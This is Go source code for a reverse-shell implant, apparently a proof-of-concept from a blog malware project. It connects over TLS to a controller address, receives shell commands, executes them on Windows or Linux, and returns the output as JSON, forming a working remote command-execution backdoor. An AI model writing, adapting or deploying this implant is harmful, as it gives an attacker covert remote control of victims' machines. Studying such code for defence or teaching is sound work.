package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os/exec"
	"runtime"
	"strings"
	// "/Blog/POC_Malwarez/arp_connect_main/ARP"
)

var (
	CONNECT string = "127.0.0.1:9999"
)

type Results struct {
	CommandsList []string
	ID           int
	Command      string
	Output       string
	Time         string
}

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

func executeCommand(checkOS string, commandString string) *Results {

	var results string
	if checkOS == "windows" {
		// fmt.Println("WINDOWS")
		CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
		if err != nil {
			fmt.Println("Error executing command", err)
			// c.Write([]byte("unable to execute command"))
			CommandExec = []byte("Error executing command")
			// NEED TO FIX UNABLE TO EXECUTE SENDING
		}
		CommandExec2 := string(CommandExec)
		results = strings.TrimSpace(CommandExec2)
		// fmt.Println(reflect.TypeOf(CommandExec))
		// fmt.Println(reflect.TypeOf(err))

	} else if checkOS == "linux" {
		// fmt.Println("LINUX")
		//fmt.Println("XS", command)
		CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
		if err != nil {
			fmt.Println("Error executing command", err)
			// c.Write([]byte("unable to execute command"))

		}
		CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
		results = strings.TrimSpace(CommandExec2)
	}
	// fmt.Println(results2)
	// results2 := [...]string{results, "END"}
	//writing
	// fmt.Fprintf(c, results2)

	//using the Results structure

	outputTest := &Results{
		ID:     1, // TODO: need to make this random for multiple children
		Output: results,

		Command: commandString,
	}
	// jsonMS, _ := json.Marshal(outputTest)
	return outputTest
}

// ===========IF NOT ADMIN YOU CANNOT SEND ARP PACKETS =====
func main() {
	fmt.Println("###PRINTING TO SCREENONLY FOR DEV PURPOSES###")
	fmt.Printf("Attempting to connect to %s \n", CONNECT)

	CA_Pool := x509.NewCertPool()
	severCert, err := ioutil.ReadFile("../openssl/mydomain.com.crt")
	if err != nil {
		log.Fatal("Could not load server certificate!")
	}
	CA_Pool.AppendCertsFromPEM(severCert)
	config := tls.Config{RootCAs: CA_Pool}
	fmt.Println("Listens as soon as it dials")
	c, err := tls.Dial("tcp", CONNECT, &config)

	// c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}

	defer c.Close()
	fmt.Println("===Connection Successful==")
	fmt.Println("Listening for commands")
	checkOS := OSCheck()
	for {

		// if c has no connect, break

		commandString := bufio.NewScanner(c)
		commandString.Scan()

		fmt.Println("Command Received->: " + commandString.Text())
		value := string(commandString.Text())
		if strings.TrimSpace(value) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
		// fmt.Println("CMD received->: ", commandString.Text())

		commandresults := executeCommand(checkOS, value)

		encoder := json.NewEncoder(c)

		encoder.Encode(commandresults)

		fmt.Println("Encoded format:", commandresults)

	}

}
